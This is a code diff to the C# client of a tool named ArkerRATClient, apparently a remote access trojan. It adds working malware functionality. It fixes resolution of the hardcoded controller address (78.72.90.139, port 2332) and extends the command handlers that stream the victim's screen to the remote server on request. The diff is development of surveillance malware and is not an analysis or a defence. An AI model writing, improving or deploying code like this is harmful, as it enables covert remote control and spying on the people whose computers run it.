@@ -16,6 +16,8 @@ using System.Security.Cryptography.X509Certificates;
 using Microsoft.Win32;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
+using System.IO.Compression;
+
 
 namespace ArkerRATClient
 {
@@ -23,7 +25,7 @@ namespace ArkerRATClient
     {
 #if DEBUG
         private static int port = 2332;
-        private static string ip ="78.72.90.139";
+        private static string ip = "78.72.90.139";
 #else
         private static int port = 0;
         private static string ip ="";
@@ -40,7 +42,16 @@ namespace ArkerRATClient
             {
                 if (CheckIfDNS(ip))
                 {
-                    ip = Dns.GetHostAddresses(ip).ToString();
+                    string dns= Dns.GetHostAddresses(ip)[0].ToString();
+                    int index = dns.LastIndexOf('\\');
+                    if(index != -1)
+                    {
+                        ip = dns.Substring(index);
+                    }
+                    else
+                    {
+                        ip = dns;
+                    }
                 }
 
                 tcpClient = new TcpClient(ip, port);
@@ -72,7 +83,7 @@ namespace ArkerRATClient
                     numberCNT++;
                 }
             }
-            if(dotCNT > 3 && numberCNT > 5)
+            if(dotCNT >= 3 && numberCNT > 5)
             {
                 return false;
             }
@@ -198,9 +209,12 @@ namespace ArkerRATClient
                         else if (startDelimiter == "§RemoteDesktopStart§")
                         {
                             if(subString.Length == 0&&!RemoteDesktop.sendingFrames)
-                            {      
-                                   RemoteDesktop.sendingFrames= true;
-                                   Task.Run(()=> RemoteDesktop.StartScreenStreaming(9));
+                            {
+                                RemoteDesktop.SendScreens();
+                            }
+                            else if (subString.Contains("§screen§"))
+                            {
+                                Task.Run(() => RemoteDesktop.StartScreenStreaming(50,subString.Replace("§screen§",string.Empty)));
                             }
                             else if (subString.Contains("§KI§"))
                             {
